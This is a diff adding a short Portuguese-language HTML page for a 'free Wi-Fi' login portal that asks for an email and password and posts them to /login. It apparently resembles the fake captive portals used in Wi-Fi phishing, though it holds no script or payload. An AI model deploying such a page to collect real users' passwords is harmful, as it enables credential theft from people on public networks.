@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<title>Wi-Fi Grátis</title>
+<style>
+    body { font-family: sans-serif; text-align: center; padding: 50px; background: #e0e0e0; }
+    .box { background: white; padding: 30px; border-radius: 10px; display: inline-block; }
+    input { display: block; width: 200px; margin: 10px auto; padding: 10px; }
+    button { background: #28a745; color: white; padding: 10px 20px; border: none; cursor: pointer; }
+</style>
+</head>
+<body>
+    <div class="box">
+        <h1>Acesso Wi-Fi Gratuito</h1>
+        <p>Para liberar a navegação por 1 hora, faça login.</p>
+        <form action="/login" method="POST">
+            <input type="email" name="email" placeholder="Email">
+            <input type="password" name="password" placeholder="Senha">
+            <button type="submit">Conectar</button>
+        </form>
+    </div>
+</body>
+</html>
